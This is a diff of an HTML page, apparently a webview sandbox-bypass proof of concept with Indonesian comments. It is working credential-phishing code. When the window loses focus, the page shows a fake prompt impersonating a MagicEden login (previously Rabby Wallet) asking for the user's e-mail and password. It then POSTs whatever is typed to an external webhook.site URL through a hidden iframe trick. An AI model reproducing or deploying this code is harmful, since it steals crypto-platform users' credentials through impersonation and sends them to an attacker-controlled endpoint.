@@ -1,8 +1,10 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title>Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Dapp)</title>
-	
+	<title>Bypass sandbox Webview UXSS</title>
+
 	<style>
 		iframe {
 			visibility: hidden;
@@ -11,42 +13,46 @@
 
 	<script>
 
-		/* ====== TAMBAHAN WEBHOOK ====== */
-		const WEBHOOK_URL = "https://webhook.site/12228f9d-ba9f-447b-aa99-c093c16b8162";
+	/* === WEBHOOK === */
+	const WEBHOOK_URL = "https://webhook.site/12228f9d-ba9f-447b-aa99-c093c16b8162";
 
-		function sendToWebhook(data) {
-			fetch(WEBHOOK_URL, {
-    method: "POST",
-    mode: "no-cors",   // <<< fix utama
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ value: data })
-});
+	function sendToWebhook(data) {
+		fetch(WEBHOOK_URL, {
+			method: "POST",
+			mode: "no-cors",
+			headers: { "Content-Type": "application/json" },
+			body: JSON.stringify({ value: data })
+		});
+	}
+	/* === END WEBHOOK === */
 
+
+	window.onblur = function () {
+
+		// tetap menggunakan iframe + javascript:prompt — sesuai script asli kamu
+		document.getElementById("iframe").src =
+			"javascript:prompt('In order to access magiceden.io\\nyou must first login on your\\nMagicEden Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+
+		// prompt return value ditampung lewat window.prompt biasa
+		const result = prompt(
+			"In order to access magiceden.io\nyou must first login on your\nMagicEden Account.\n\nPlease type your e-mail\nand your password:\n",
+			"E-mail / Password."
+		);
+
+		// kirim ke webhook
+		if (result !== null) {
+			sendToWebhook(result);
 		}
-		/* ====== END WEBHOOK ====== */
-
-
-		window.onblur = function () {
-			const result = prompt(
-				"In order to access rabby.io\nyou must first login on your\nRabbyWallet Account.\n\nPlease type your e-mail\nand your password:\n",
-				"E-mail / Password."
-			);
-
-			/* ==== KIRIM KE WEBHOOK === */
-			if (result !== null) {
-				sendToWebhook(result);
-			}
-			/* ==== END ==== */
-
-		}
+	};
 	</script>
 </head>
 
 <body>
 	<center>
 		<br>
-		<h1>Click Hereeeee</h1>
+		<h1>Click Hereeeee aja</h1>
 	</center>
+
 	<iframe id="iframe"></iframe>
 </body>
 </html>
